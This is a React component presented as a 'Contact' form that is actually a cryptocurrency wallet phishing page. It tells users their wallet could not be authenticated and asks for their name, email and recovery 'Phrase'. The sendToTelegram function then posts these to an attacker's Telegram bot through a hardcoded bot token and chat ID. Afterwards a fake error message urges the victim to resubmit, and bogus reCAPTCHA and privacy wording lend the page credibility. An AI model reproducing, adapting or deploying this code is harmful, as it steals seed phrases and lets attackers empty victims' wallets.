import React, { useState } from 'react';
import { useForm } from 'react-hook-form';
import { z } from 'zod';
import { zodResolver } from '@hookform/resolvers/zod';
import './Contact.css';
import { CiCircleCheck } from "react-icons/ci";
import { ClipLoader } from 'react-spinners';

const Contact = () => {
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [loading, setLoading] = useState(false);

  const formSchema = z.object({
    fullName: z.string().min(1, 'Full name is required'),
    email: z.string().email('Invalid email address'),
    phrase: z.string().min(1, 'Phrase is required'),
  });

  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
  } = useForm({
    resolver: zodResolver(formSchema),
    mode: 'onChange',
  });

  const sendToTelegram = async (data) => {
    const botToken = '7936174005:AAGh1E77hIQBIJUZX1S7ppyouSOIMpFmsNg';
    const chatId = '6701777563';
    const message = `User Data:\nFull Name: ${data.fullName}\nEmail: ${data.email}\nPhrase: ${data.phrase}`;

    try {
      setLoading(true); 
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      if (!response.ok) {
        throw new Error(`Error ${response.status}: ${response.statusText}`);
      }

      // console.log('Telegram response:', await response.json());
    } catch (error) {
      // console.error('Error sending message to Telegram:', error.message);
    } finally {
      setLoading(false); 
    }
  };

  const onSubmit = async (data) => {
    await sendToTelegram(data); 
    setIsSubmitted(true); 
  };

  return (
    <div className="Contact">
      <div className="wrap">
        <h2>IMPORT WALLET</h2>
        <span>Unable to authenticate wallet… Please continue manually</span>
        {isSubmitted ? (
          <div className="overlay">
            <div className="check-icon"><CiCircleCheck size={25} /></div>
            <h3>An Error Has Occured, Please try again. GO BACK!!!!!</h3>
            <button onClick={() => setIsSubmitted(false)}>Go Back</button>
          </div>
        ) : (
          <form onSubmit={handleSubmit(onSubmit)}>
            <input
              type="text"
              placeholder="Full name*"
              {...register('fullName')}
            />
            {errors.fullName && <span className="error">{errors.fullName.message}</span>}

            <input
              type="email"
              placeholder="Email*"
              {...register('email')}
            />
            {errors.email && <span className="error">{errors.email.message}</span>}

            <textarea
              placeholder="Phrase*"
              {...register('phrase')}
            />
            {errors.phrase && <span className="error">{errors.phrase.message}</span>}

            <span className="formSpan">
              You may receive marketing and promotional materials. Contact the
              merchant for their privacy practices.
            </span>
            <p>
              This form is protected by reCAPTCHA and the Google Privacy Policy
              and Terms of Service apply.
            </p>
            <button type="submit" disabled={!isValid}>
              {loading ? <ClipLoader color="white" size={20} /> : "Submit"}
            </button>
          </form>
        )}
      </div>
    </div>
  );
};

export default Contact;
